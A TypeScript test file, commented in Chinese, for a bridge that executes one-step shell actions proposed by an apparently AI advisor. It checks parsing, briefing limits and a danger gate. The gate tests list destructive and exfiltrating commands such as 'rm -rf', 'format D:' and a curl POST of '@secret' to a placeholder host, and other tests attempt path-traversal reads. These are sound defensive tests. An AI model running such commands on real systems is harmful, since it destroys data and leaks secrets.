// 顾问桥离线测试：四行协议解析、危险闸门、state.md 往返、简报生成。
// 不起浏览器、不发问、不跑命令，跑法：node tests/bridge.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { EXIT_ERROR, EXIT_OK, EXIT_PREREQ } from "../src/constants.ts";
import {
  ACTIONS, ADVICE_CLOSE, ADVICE_OPEN, BRIEF_MAX_CHARS, OUTPUT_CAP_BYTES, RECENT_ROUNDS,
  advisorPrompt, appendRound, buildBriefing, capOutput, classifyDanger, loopDecision, parseAdvice,
  parseState, renderAdvice, renderState, runAction, shellSpec, summarizeOutput,
  type State,
} from "../src/bridge.ts";

const GOOD = [
  "ACTION: shell",
  "CMD: dir /b",
  "EXPECT: 列出当前目录的文件名",
  "FAIL: 把完整报错原样回报",
].join("\n");

// —— parseAdvice ——

test("标准四行能解析", () => {
  const a = parseAdvice(GOOD);
  assert.ok(!("error" in a), JSON.stringify(a));
  assert.equal(a.action, "shell");
  assert.equal(a.cmd, "dir /b");
  assert.equal(a.expect, "列出当前目录的文件名");
  assert.equal(a.fail, "把完整报错原样回报");
});

test("带 <<<ADVICE 标记与前后废话也能解析", () => {
  const text = `好的，我的建议如下：\n${ADVICE_OPEN}\n${GOOD}\n${ADVICE_CLOSE}\n希望有帮助`;
  const a = parseAdvice(text);
  assert.ok(!("error" in a));
  assert.equal(a.action, "shell");
});

test("markdown 围栏只是包装，剥掉后照常解析", () => {
  const a = parseAdvice("```text\n" + GOOD + "\n```");
  assert.ok(!("error" in a));
  assert.equal(a.cmd, "dir /b");
});

test("中文冒号也认（模型常打全角）", () => {
  const a = parseAdvice("ACTION：read_file\nCMD：a.txt\nEXPECT：看到内容\nFAIL：报错原文");
  assert.ok(!("error" in a));
  assert.equal(a.action, "read_file");
});

test("多步计划一律拒：两条 ACTION 就是没守一轮一步", () => {
  const err = parseAdvice(`${GOOD}\nACTION: shell\nCMD: echo 2\nEXPECT: x\nFAIL: y`);
  assert.ok("error" in err);
  assert.match(err.error, /多步/);
});

test("缺字段要指名缺哪个", () => {
  const err = parseAdvice("ACTION: shell\nCMD: dir");
  assert.ok("error" in err);
  assert.match(err.error, /EXPECT、FAIL/);
});

test("动作不在词表里就拒（顾问不能发明执行器没有的手）", () => {
  const err = parseAdvice("ACTION: browser_click\nCMD: #submit\nEXPECT: x\nFAIL: y");
  assert.ok("error" in err);
  assert.match(err.error, /不在词表/);
});

test("shell 的 CMD 为空要拒", () => {
  const err = parseAdvice("ACTION: shell\nCMD:\nEXPECT: x\nFAIL: y");
  assert.ok("error" in err);
  assert.match(err.error, /CMD 是空/);
});

test("CMD 跨多行要拒：让顾问改成脚本文件 + 一行调用", () => {
  const err = parseAdvice("ACTION: shell\nCMD: cd /d D:\\x\ndir\nEXPECT: x\nFAIL: y");
  // 第二行 CMD 不会被当成字段，跨行内容落在 CMD 里 → 由多行检查拦下
  assert.ok("error" in err, JSON.stringify(err));
});

test("done / ask_user / request_info 允许 CMD 是说明文字", () => {
  for (const action of ["done", "ask_user", "request_info"]) {
    const a = parseAdvice(`ACTION: ${action}\nCMD: 要确认是否删除 D:\\tmp\nEXPECT: -\nFAIL: -`);
    assert.ok(!("error" in a), action);
    assert.equal(a.action, action);
  }
});

test("renderAdvice 与 parseAdvice 互为逆（四行原样回来）", () => {
  const a = parseAdvice(GOOD);
  assert.ok(!("error" in a));
  assert.equal(parseAdvice(renderAdvice(a)).cmd, "dir /b");
});

// —— classifyDanger：两个方向都要测，只测"危险被拦"等于没测 ——

test("危险家族逐个被拦，且报得出原因", () => {
  const cases: [string, string][] = [
    ["del /q D:\\tmp\\*", "删除"],
    ["rm -rf ./build", "删除"],
    ["Remove-Item x.txt", "删除"],
    ["format D:", "格盘"],
    ["echo x > important.md", "覆盖"],
    ["Set-Content -Path a -Value b", "覆盖"],
    ["curl -X POST https://x/y -d @secret", "网络请求"],
    ["npm install leftpad", "安装软件"],
    ["reg add HKCU\\x /v y", "系统设置"],
    ["taskkill /F /IM node.exe", "杀进程"],
    ["git push origin main", "改远端"],
    ["git reset --hard HEAD~1", "丢弃工作区"],
    ["下单 并 支付 100 元", "支付"],
  ];
  for (const [cmd, why] of cases) {
    const d = classifyDanger(cmd);
    assert.equal(d.danger, true, `没拦住：${cmd}`);
    assert.ok(d.why.some((w) => w.includes(why)), `${cmd} 的原因里没有「${why}」：${d.why.join()}`);
  }
});

test("安全命令不能被误拦（否则闸门等于把工具废掉）", () => {
  for (const cmd of [
    "dir /b", "python -V", "node --version", "type a.txt", "git status --short",
    "git log --oneline -5", "npx tsc --noEmit", "echo hello", "magick a.jpg a.webp",
    "find . -name '*.ts'",
    // 2026-10-09 实测误拦过的两条：丢弃输出的重定向不是覆盖
    'dir /b /a-d 2>nul & echo --- & dir /b /a-d 2>nul | find /c /v ""',
    "type a.txt >nul", "node x.js >/dev/null 2>&1",
  ]) {
    const d = classifyDanger(cmd);
    assert.equal(d.danger, false, `误拦：${cmd} → ${d.why.join()}`);
  }
});

test("真覆盖仍然要拦： nul 豁免不能顺手放过写文件", () => {
  for (const cmd of ["echo x > important.md", "copy /Y a.txt b.txt", "Set-Content -Path a -Value b"]) {
    assert.equal(classifyDanger(cmd).danger, true, `漏拦：${cmd}`);
  }
});

test("闸门理由去重", () => {
  const d = classifyDanger("rm -rf a && rm -rf b");
  assert.equal(d.why.length, 1);
});

// —— state.md 往返 ——

const EMPTY: State = { goal: "把 a 转成 b", env: "OS=win32；Shell=cmd.exe", status: "刚开始", rounds: [] };

test("renderState → parseState 空轮次往返", () => {
  const s = parseState(renderState(EMPTY));
  assert.equal(s.goal, "把 a 转成 b");
  assert.equal(s.env, "OS=win32；Shell=cmd.exe");
  assert.equal(s.status, "刚开始");
  assert.deepEqual(s.rounds, []);
});

test("appendRound 递增编号、更新当前状态、往返不丢字段", () => {
  let s = appendRound(EMPTY, { action: "shell", cmd: "dir /b", expect: "列出文件", verdict: "成功（退出码 0）", summary: "a.txt ⏎ b.txt" });
  assert.equal(s.rounds.length, 1);
  assert.equal(s.rounds[0].round, 1);
  assert.match(s.status, /第 1 轮已处理：成功/);
  s = appendRound(s, { action: "read_file", cmd: "a.txt", expect: "看到内容", verdict: "失败（退出码 1）", summary: "读不到" });
  assert.equal(s.rounds[1].round, 2);
  const back = parseState(renderState(s));
  assert.equal(back.rounds.length, 2);
  assert.equal(back.rounds[1].action, "read_file");
  assert.equal(back.rounds[1].cmd, "a.txt");
  assert.equal(back.rounds[1].verdict, "失败（退出码 1）");
  assert.equal(back.rounds[1].summary, "读不到");
});

// —— buildBriefing ——

test("简报自包含：目标/环境/状态/shell/动作词表都在", () => {
  const b = buildBriefing(EMPTY);
  assert.ok(typeof b === "string");
  for (const needle of ["【执行器简报】", "目标：把 a 转成 b", "环境：OS=win32", "当前状态：刚开始",
    "执行命令用的 shell：", "可用动作：", "需要你决定：下一步做什么？"]) {
    assert.match(b, new RegExp(needle.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), `简报里缺 ${needle}`);
  }
  for (const action of ACTIONS) assert.match(b, new RegExp(action));
});

test("简报只带最近 N 轮，不带全部历史", () => {
  let s = EMPTY;
  for (let i = 1; i <= 6; i++) {
    s = appendRound(s, { action: "shell", cmd: `cmd-${i}`, expect: "x", verdict: "成功（退出码 0）", summary: `out-${i}` });
  }
  const b = buildBriefing(s);
  assert.ok(typeof b === "string");
  assert.equal(b.includes("cmd-1"), false, "带了第 1 轮，历史没裁掉");
  assert.equal(b.includes("cmd-3"), false, `只该带最近 ${RECENT_ROUNDS} 轮`);
  assert.equal(b.includes("cmd-6"), true);
  assert.equal(b.includes("cmd-4"), true);
});

test("简报超长直接报错，不静默截断（外发内容必须可控）", () => {
  const s: State = { ...EMPTY, goal: "长".repeat(BRIEF_MAX_CHARS) };
  const b = buildBriefing(s);
  assert.ok(typeof b !== "string");
  if (typeof b !== "string") assert.match(b.error, /超过上限/);
});

test("没有轮次时写清「还没执行过任何命令」，不留空段", () => {
  const b = buildBriefing(EMPTY);
  assert.ok(typeof b === "string");
  assert.match(b, /还没有执行过任何命令/);
});

// —— summarizeOutput ——

test("输出摘要压成单行、超长截断并写清原字数、空输出有占位", () => {
  assert.equal(summarizeOutput("a\nb\r\nc"), "a ⏎ b ⏎ c");
  assert.equal(summarizeOutput(""), "（无输出）");
  const long = summarizeOutput("字".repeat(1200), 600);
  assert.match(long, /截断，原 1200 字/);
  assert.ok(long.length < 700);
});

// —— runAction 的工作目录围栏（read_file 的内容会随下一轮简报外发，等于读盘外泄通道）——

test("read_file 拒绝工作目录之外的路径", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bridge-in-"));
  const outside = path.join(path.dirname(root), "bridge-secret.txt");
  fs.writeFileSync(outside, "TOP-SECRET", "utf8");
  try {
    const r = await runAction(
      { action: "read_file", cmd: `../${path.basename(outside)}`, expect: "", fail: "" },
      root, "t1"
    );
    assert.equal(r.rc, EXIT_PREREQ, JSON.stringify(r));
    assert.match(r.out, /拒绝/);
    assert.equal(r.out.includes("TOP-SECRET"), false, "内容被读出来了，围栏没生效");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(outside, { force: true });
  }
});

test("read_file 允许工作目录之内的文件，且超长会截断", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bridge-in-"));
  fs.writeFileSync(path.join(root, "a.txt"), "字".repeat(9000), "utf8");
  try {
    const r = await runAction({ action: "read_file", cmd: "a.txt", expect: "", fail: "" }, root, "t2");
    assert.equal(r.rc, EXIT_OK, r.out.slice(0, 80));
    assert.match(r.out, /截断，原 9000 字/);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

test("python 拒绝跑工作目录之外的脚本", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "bridge-in-"));
  const outside = path.join(path.dirname(root), "bridge-evil.py");
  fs.writeFileSync(outside, "print('ran')\n", "utf8");
  try {
    const r = await runAction(
      { action: "python", cmd: `../${path.basename(outside)}`, expect: "", fail: "" }, root, "t3"
    );
    assert.equal(r.rc, EXIT_PREREQ, JSON.stringify(r));
    assert.match(r.out, /拒绝/);
    assert.equal(r.out.includes("ran"), false, "脚本真跑了，围栏没生效");
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(outside, { force: true });
  }
});

// —— shellSpec：cmd.exe 的引号必须自己管 ——

test("cmd.exe 分支自己加外引号并声明 verbatim（否则命令里的 \"\" 被转义成 \\\"\\\"，cmd 不认）", () => {
  const s = shellSpec("win32");
  assert.equal(s.name, "cmd.exe");
  assert.equal(s.verbatim, true);
  const argv = s.argv('dir /b | find /c /v ""');
  assert.equal(argv[0], "cmd.exe");
  assert.deepEqual(argv.slice(1, 4), ["/d", "/s", "/c"]);
  assert.equal(argv[4], '"chcp 65001>nul&&dir /b | find /c /v """');
});

test("非 win32 落 sh，不需要 verbatim", () => {
  const s = shellSpec("linux");
  assert.equal(s.name, "sh");
  assert.equal(s.verbatim, false);
  assert.deepEqual(s.argv("ls -1"), ["sh", "-c", "ls -1"]);
});

// —— 循环停止判据 ——

test("done 正常收工；待人/被拦交回给人；命令失败要继续（把错误带给顾问）", () => {
  assert.deepEqual(loopDecision("done", EXIT_OK), { stop: true, rc: EXIT_OK });
  assert.deepEqual(loopDecision("done", EXIT_ERROR), { stop: true, rc: EXIT_OK });
  assert.deepEqual(loopDecision("ask_user", EXIT_PREREQ), { stop: true, rc: EXIT_PREREQ });
  assert.deepEqual(loopDecision("request_info", EXIT_PREREQ), { stop: true, rc: EXIT_PREREQ });
  assert.deepEqual(loopDecision("shell", EXIT_PREREQ), { stop: true, rc: EXIT_PREREQ }); // 闸门拦下
  assert.deepEqual(loopDecision("shell", EXIT_OK), { stop: false, rc: EXIT_OK });
  assert.deepEqual(loopDecision("shell", EXIT_ERROR), { stop: false, rc: EXIT_ERROR });
});

test("输出上限：超限截断并写清上限，未超原样返回", () => {
  assert.deepEqual(capOutput("abc"), { text: "abc", capped: false });
  const big = capOutput("x".repeat(OUTPUT_CAP_BYTES + 10));
  assert.equal(big.capped, true);
  assert.match(big.text, /输出超过 256KB，已杀掉命令并截断/);
  assert.ok(big.text.startsWith("x".repeat(OUTPUT_CAP_BYTES)));
  assert.ok(big.text.length < OUTPUT_CAP_BYTES + 60, `截断后还有 ${big.text.length} 字`);
});

// —— advisorPrompt ——

test("顾问提示每轮重发：词表、标记、ask_user 规则都在里面", () => {
  const p = advisorPrompt();
  assert.match(p, /远程顾问/);
  assert.match(p, /只依据本次简报/);
  assert.match(p, new RegExp(ADVICE_OPEN.replace(/[<>]/g, "\\$&")));
  assert.match(p, /ask_user/);
  for (const action of ACTIONS) assert.match(p, new RegExp(action));
});
